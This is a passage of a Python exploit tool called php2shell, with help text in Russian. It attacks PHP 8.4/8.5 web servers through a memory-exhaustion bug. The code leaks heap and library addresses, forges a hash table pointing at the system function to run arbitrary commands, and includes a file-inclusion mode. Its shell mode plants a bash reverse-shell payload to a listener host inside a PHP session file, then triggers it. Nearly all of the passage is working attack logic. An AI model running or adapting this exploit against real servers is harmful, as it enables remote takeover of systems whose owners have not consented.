  php2shell.py -u http://127.0.0.1:18080/index.php -c id
  php2shell.py -u http://127.0.0.1:18080/index.php --auto
  php2shell.py -u http://127.0.0.1:18080/index.php -m leak
  php2shell.py -u http://127.0.0.1:18080/index.php -m trigger
  php2shell.py -u http://127.0.0.1:18080/index.php -m shell --lhost 192.168.1.10 --lport 4444
  php2shell.py -u http://127.0.0.1:18082/index.php -m lfi --sink '/index.php?page=' -c id
""")
    parser._optionals.title = "параметры"
    parser.add_argument("-h", "--help", action="help", help="показать эту справку")
    parser.add_argument("-u", "--url", default="", metavar="АДРЕС",
                    help="адрес цели, например http://127.0.0.1:18080/index.php")
    parser.add_argument("-v", "--version", action="version", version=f"php2shell {VERSION}",
                    help="показать версию")
    parser.add_argument("--list", dest="list", action="store_true",
                    help="показать профили и смещения")
    parser.add_argument("-c", "--cmd", dest="command", default="id", metavar="КОМАНДА",
                    help="команда для выполнения (по умолчанию id); вывод собирается автоматически")
    parser.add_argument("-m", "--mode", choices=("rce", "leak", "trigger", "shell", "lfi"),
                    default="rce", metavar="РЕЖИМ",
                    help="режим: rce — выполнить команду (авто-вывод), leak — только утечки, trigger — только сбой памяти и утечка, shell — обратный шелл, lfi — включение файла через приложение")
    parser.add_argument("-p", "--profile", default="auto",
                    choices=("auto", "84", "85", "lab", "bookworm", "8511"),
                    metavar="ПРОФИЛЬ",
                    help="профиль сборки: auto — определить, 84 — PHP 8.4, 85 — PHP 8.5, lab — самосборный стенд")
    parser.add_argument("-a", "--auto", action="store_true",
                    help="авто: контейнер, память, смещения, доказательство")
    parser.add_argument("-b", "--box", "--docker-container", dest="box", default="", metavar="ИМЯ",
                    help="локальный контейнер с целью")
    parser.add_argument("-l", "--lib", default="", metavar="ПУТЬ",
                    help="локальный файл библиотеки PHP для смещений")
    parser.add_argument("--zif", "--zif-offset", dest="zif", type=lambda x: int(x, 0), default=None,
                    metavar="HEX", help="смещение zif_system")
    parser.add_argument("--dtor", "--dtor-offset", dest="dtor", type=lambda x: int(x, 0), default=None,
                    metavar="HEX", help="смещение zval_ptr_dtor")
    parser.add_argument("--ht", "--htdata-offset", dest="ht", type=lambda x: int(x, 0), default=None,
                    metavar="HEX", help="смещение поддельной таблицы хешей в куче")
    parser.add_argument("--huge", "--huge-megabytes", dest="huge", type=int, default=None, metavar="МБ",
                    help="размер поля нехватки памяти")
    parser.add_argument("-F", "--proof", "--proof-file", dest="proof", default="", metavar="ПУТЬ",
                    help="файл, который пишет команда")
    parser.add_argument("-f", "--fetch", default="", metavar="ПУТЬ",
                    help="путь запроса после выстрела")
    parser.add_argument("-k", "--mark", "--marker", dest="mark", default="", metavar="СТРОКА",
                    help="строка, обязательная в ответе")
    parser.add_argument("-B", "--blind", action="store_true",
                    help="один выстрел без сбора вывода")
    parser.add_argument("-o", "--overwrite", action="store_true",
                    help="разрешить перезапись файла доказательства или дампа")
    parser.add_argument("-d", "--dump", "--dump-cookie", dest="dump", default="", metavar="ПУТЬ",
                    help="куда сохранить утечку")
    parser.add_argument("--auto-container", action="store_true",
                    help="найти контейнер по порту")
    parser.add_argument("--auto-huge", action="store_true",
                    help="подобрать поле нехватки памяти по лимиту памяти")
    parser.add_argument("--auto-offsets", action="store_true",
                    help="взять символы из официального образа нужной версии")
    parser.add_argument("--auto-proof", action="store_true",
                    help="найти путь доказательства через /out")
    parser.add_argument("-e", "--sep", dest="separator", default="semi", metavar="ТИП",
                    choices=("semi", "comma", "space"),
                    help="разделитель типа содержимого: semi — ;, comma — ,, space — пробел")
    parser.add_argument("-L", "--lhost", default="", metavar="АДРЕС",
                    help="адрес, на который придёт шелл")
    parser.add_argument("-P", "--lport", type=int, default=0, metavar="ПОРТ",
                    help="порт слушателя (0 — свободный)")
    parser.add_argument("-n", "--no-listen", action="store_true",
                    help="не поднимать слушатель (свой nc)")
    parser.add_argument("-x", "--sink", default="", metavar="АДРЕС",
                    help="адрес включения файла")
    parser.add_argument("-s", "--save", default="/tmp", metavar="ПУТЬ",
                    help="путь сохранения сессий")
    parser.add_argument("-S", "--sid", default="a", metavar="СИМВОЛ",
                    help="идентификатор сессии для шелла или включения файла, один символ")
    parser.add_argument("-r", "--retries", type=int, default=3, metavar="N",
                    help="попытки на этап")
    parser.add_argument("-t", "--timeout", type=float, default=30.0, metavar="СЕК",
                    help="таймаут запроса")
    parser.add_argument("--leak-only", action="store_true",
                    help="остановиться после утечек")
    parser.add_argument("--trigger-only", action="store_true",
                    help="только сбой памяти и утечка")
    parser.add_argument("-j", "--json", action="store_true",
                    help="машинный вывод")
    parser.add_argument("--plain", action="store_true",
                    help="без цветов")
    parser.add_argument("-q", "--quiet", action="store_true",
                    help="только результат")
    args = parser.parse_args()
    ARGS = args
    if args.list:
        print("профили:")
        for profile_key, prof in PROFILES.items():
            print(f"{profile_key:<4} {prof['ver']:<6} zif=0x{prof['zif']:x} dtor=0x{prof['dtor']:x} ht=0x{prof['ht']:x}")
        return 0
    if not args.url:
        parser.error("не задан адрес цели — используй -u/--url")

    if args.plain or not sys.stdout.isatty() or os.environ.get("NO_COLOR"):
        for color in COLORS:
            COLORS[color] = ""
    if args.auto:
        args.auto_container = args.auto_huge = args.auto_offsets = args.auto_proof = True
    if args.leak_only:
        args.mode = "leak"
    if args.trigger_only:
        args.mode = "trigger"
    if args.fetch and not args.mark:
        parser.error("для --fetch нужен --mark")
    if args.mode == "lfi" and not args.sink:
        parser.error("для lfi нужен --sink")
    SILENT = args.quiet or args.json

    sock = Sock(args.url, args.timeout)
    box = args.box
    if not box:
        box = find_box(args.url)

    if args.mode == "lfi":
        return lfi(sock, args)

    key = args.profile
    version = ""
    if key in ("auto", "bookworm", "8511"):
        version, server = fingerprint(sock)
        if not version:
            version = box_ver(box)
        key = pick(version) or ("85" if key == "8511" else "84")
        if version:
            say("сборка", f"PHP/{version} {server}".strip())
    key = "84" if key == "bookworm" else "85" if key == "8511" else key
    prof = PROFILES[key]
    say("цель", args.url)
    say("профиль", f"{key} ({prof['ver']})")

    zif, dtor = prof["zif"], prof["dtor"]
    source = "profile"
    if args.mode == "trigger":
        pass
    elif args.lib:
        zif, dtor = lib_off(args.lib)
        source = args.lib
    elif box:
        try:
            zif, dtor = box_off(box)
            source = f"box:{box}"
        except Exception:
            pass
    elif args.auto_offsets and version:
        try:
            zif, dtor = img_off(f"php:{version}-apache")
            source = f"image:{version}"
        except Exception as e:
            say("внимание", f"не удалось получить смещения: {e}", "orange")
    if args.zif is not None:
        zif = args.zif
        source = "cli"
    if args.dtor is not None:
        dtor = args.dtor
        source = "cli"

    huge = args.huge if args.huge is not None else prof["huge"]
    if args.auto_huge and args.huge is None:
        raw = get_ini(box, "memory_limit")
        memory_limit = megabytes(raw)
        if memory_limit and memory_limit > 0:
            huge = max(prof["huge"], memory_limit + memory_limit // 4)
            say("память", f"{memory_limit}M -> {huge} MB")
            post_max = megabytes(get_ini(box, "post_max_size"))
            if post_max and huge >= post_max:
                say("внимание", f"поле нехватки памяти >= post_max_size ({post_max} MB)", "orange")
        elif raw == "-1":
            say("внимание", "memory_limit=-1: сбой памяти отключён", "orange")

    proof = args.proof
    if args.auto_proof and not proof:
        match = re.search(r">>?\s*(/out/\S+)", args.command)
        if match and box:
            mount_point = mount(box, "/out")
            if mount_point:
                proof = os.path.join(mount_point, os.path.basename(match.group(1)))

    separator = ";" if args.separator == "semi" else "," if args.separator == "comma" else " "
    run = Run(sock, prof, zif, dtor, huge, separator)
    if args.mode != "trigger":
        say("смещ.", f"zif=0x{zif:x} dtor=0x{dtor:x} ht=0x{prof['ht']:x}")

    if args.mode == "trigger":
        run.swap()
        chunk, raw = run.heap()
        if not raw:
            say("ошибка", "триггер", "red")
            return end(False, error="триггер")
        say("куча", f"0x{chunk:x} ({len(raw)} B)" if chunk else f"{len(raw)} B")
        if args.quiet and not args.json:
            print(f"cookie={len(raw)} chunk={hex(chunk) if chunk else ''}", flush=True)
        if args.dump:
            try:
                save(args.dump, raw, args.overwrite)
            except OSError as e:
                say("ошибка", str(e), "red")
                return end(False, error=str(e))
        return end(True, mode="trigger", cookie=len(raw), chunk=hex(chunk) if chunk else "")

    run.swap()
    chunk, raw = get_heap(run, args.retries)
    if not chunk:
        say("ошибка", "утечка кучи", "red")
        say("подсказка", "проверь display_errors=On, memory_limit < поля нехватки памяти и один worker", "orange")
        return end(False, error="утечка кучи")
    say("куча", f"0x{chunk:x} ({len(raw)} B)")

    run.swap()
    lib = get_lib(run, args.retries)
    if not lib:
        say("ошибка", "утечка libphp", "red")
        say("подсказка", "неверные смещения для этой сборки; используй --auto или --lib", "orange")
        return end(False, error="утечка libphp")
    say("libphp", f"0x{lib:x}")

    if args.mode == "leak":
        if args.dump:
            try:
                save(args.dump, raw, args.overwrite)
            except OSError as e:
                say("ошибка", str(e), "red")
                return end(False, error=str(e))
        say("готово", f"chunk=0x{chunk:x} lib=0x{lib:x}", "green")
        if args.quiet and not args.json:
            print(f"chunk=0x{chunk:x} lib=0x{lib:x}", flush=True)
        return end(True, mode="leak", chunk=hex(chunk), lib=hex(lib))

    run.table = chunk + (args.ht if args.ht is not None else prof["ht"])
    run.system = lib + zif
    say("выстрел", f"ht=0x{run.table:x} zif=0x{run.system:x}")
    run.swap()

    if args.mode == "rce" and not args.blind and not proof and not args.fetch:
        return exec_remote(sock, run, args, box, prof)

    if args.mode == "shell":
        host = args.lhost or local_ip()
        port = args.lport or (4444 if args.no_listen else free_port())
        if not host:
            say("ошибка", "не задан адрес слушателя; передай --lhost", "red")
            return end(False, error="адрес слушателя")
        if not re.fullmatch(r"[A-Za-z0-9.:-]+", host):
            say("ошибка", "неверный адрес слушателя", "red")
            return end(False, error="адрес слушателя")
        if not (1 <= port <= 65535):
            say("ошибка", "неверный порт слушателя", "red")
            return end(False, error="порт слушателя")
        session_path = args.save
        if box:
            session_path = get_ini(box, "session.save_path") or session_path
        if not session_path:
            session_path = "/tmp"
        sid = args.sid
        path = session_path.rstrip("/") + "/sess_" + sid
        carrier = "sh<" + path
        if len(carrier.encode()) > MAX_CMD:
            say("ошибка", f"путь сессии слишком длинный: {carrier} ({len(carrier)} > {MAX_CMD})", "red")
            say("подсказка", "нужен короткий save_path (например, /tmp) и --sid из одного символа", "orange")
            return end(False, error="путь сессии слишком длинный")
        thread = None
        if args.no_listen:
            say("слушаю", "внешний (--no-listen)")
        else:
            ready = threading.Event()
            thread = threading.Thread(target=talk, args=(port, ready), daemon=True)
            thread.start()
            ready.wait(3)
        payload = f";bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1';#".encode()
        if box:
            subprocess.run(["docker", "exec", box, "rm", "-f", path], check=False,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        say("запись", f"{path} ({len(payload)} B)")
        try:
            run.seed(payload, sid)
        except OSError as e:
            say("ошибка", str(e), "red")
            return end(False, error=str(e))
        run.swap()
        try:
            run.shot(carrier.encode())
        except OSError as e:
            say("ошибка", str(e), "red")
        if thread is not None:
            thread.join(60)
        else:
            say("готово", "выстрел сделан; проверь слушатель", "green")
            return end(True, mode="shell", external=True)
        return end(True, mode="shell")

    if proof and os.path.lexists(proof):
        if not args.overwrite:
            say("ошибка", f"файл доказательства уже существует: {proof}", "red")
            return end(False, error="доказательство существует")
        if os.path.islink(proof) or not os.path.isfile(proof):
            say("ошибка", f"файл доказательства не обычный файл: {proof}", "red")
            return end(False, error="путь доказательства")
        os.unlink(proof)

    base = None
    if args.fetch:
        status, body = sock.get(args.fetch)
        base = (status, body)
        say("проверка", f"{args.fetch} -> {status} ({len(body)} B)")

    if args.blind:
        try:
            run.shot(args.command.encode())
        except OSError as e:
            say("ошибка", str(e), "red")
            return end(False, error=str(e))
        say("готово", "выстрел сделан вслепую", "green")
        return end(True, mode="rce", blind=True)

    for i in range(1, args.retries + 3):
        try:
            run.shot(args.command.encode())
        except OSError as e:
            say("внимание", f"запрос: {e}", "orange")
        time.sleep(0.8)
        result = ""
        if proof:
            try:
                result = Path(proof).read_text(errors="replace").strip()
            except OSError:
                pass
        if not result and args.fetch:
            status, body = sock.get(args.fetch)
            if status == 200 and (base is None or (status, body) != base):
                result = body.decode("latin1", "replace").strip()
        if result and (not args.mark or args.mark in result):
            say("ответ", result, "green")
            if args.quiet and not args.json:
                print(result, flush=True)
            return end(True, mode="rce", profile=key, chunk=hex(chunk),
                       lib=hex(lib), proof=result)
        say("попытка", f"{i}/{args.retries + 2}", "orange")
        run.swap()

    say("ошибка", "нет доказательства", "red")
    say("подсказка", "попробуй -m leak, --auto или --blind с обратным вызовом", "orange")
    return end(False, error="нет доказательства")


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
